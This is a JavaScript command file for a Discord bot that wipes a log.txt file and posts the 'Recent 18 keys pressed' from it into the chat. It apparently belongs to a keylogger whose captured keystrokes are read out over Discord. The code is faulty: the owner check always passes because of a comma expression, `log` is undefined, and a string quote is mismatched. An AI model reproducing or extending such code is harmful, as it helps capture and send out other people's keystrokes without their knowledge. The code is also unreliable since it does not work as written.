const fs = require("fs");
module.exports = {
    name: "wipe",
    description: "Wipes log.txt",
    execute(message, client, args, Discord) {
        if ((message.author.id == "910968511273263104", "418876976963649536")) {
            fs.writeFileSync("./log.txt", ``);
        }

        const wipedembed = new Discord.MessageEmbed()
            .setColor(`RANDOM`)
            .setTitle(`💻 \`log.txt\' Wiped!`)
            .addFields({
                name: "**Recent 18 keys pressed**",
                value: `\`\`\`${log.slice(0, 250)}\`\`\``,
                inline: false,
            })
            .setTimestamp();

        message.channel.send({
            embeds: [wipedembed],
        });
    },
};